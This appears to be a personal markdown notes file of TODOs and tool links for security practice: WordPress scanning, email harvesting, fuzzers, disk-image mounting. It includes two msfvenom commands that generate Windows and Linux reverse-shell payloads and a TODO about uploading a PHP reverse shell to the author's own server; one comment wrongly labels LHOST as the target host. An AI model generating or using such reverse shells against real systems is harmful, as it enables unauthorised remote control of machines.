# MOTHERS OF ALL
https://github.com/Hack-with-Github/Awesome-Hacking

TODO - track cura bug issue
TODO - execute script on shutdown 
       so far:
       service in /usr/lib/systemd/system-shutdown/clean_gnome_home.shutdown
       script in /bin/clean_home
TODO - for Python relevant stuff make a Notebook rather than a .md file (Python.md)
TODO - Lucy: save current pixel configuration -> will need dedicated function to restore
TODO - Upload PHP reverse shell onto (own) webserver, REQUIRES: docker container with apache & PHP
TODO - declutter and extend Dockerfiles folder
TODO - Evaluate Docker Setups and discard flask-redis


## BSS section
containing statically-allocated variables

## Evaluate WordPress
https://github.com/sammanthp007/WordPress-Pentesting-Setup
$ wpscan

## CRAWL
git clone https://github.com/killswitch-GUI/SimplyEmail.git
$ theharvester

## FUZZER
https://github.com/mirrorer/afl.git
https://github.com/jtpereyda/boofuzz.git # pip install boofuzz

## TRIDACTYL direct Download
https://tridactyl.cmcaine.co.uk/betas/tridactyl-latest.xpi

## Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
-f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt
## Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \ # Specify the payload
            LHOST=127.0.0.1             \ # Target host to connect
            LPORT=4444                  \ # Target port
         -b '\x00'                      \ # Bad characters
         -f python                        # Format of the payload

### Mount qcow2 files
modprobe nbd
qemu-nbd --connect=/dev/nbd0 /path/to/qcow2file
mount /dev/nbd0p1 mnt

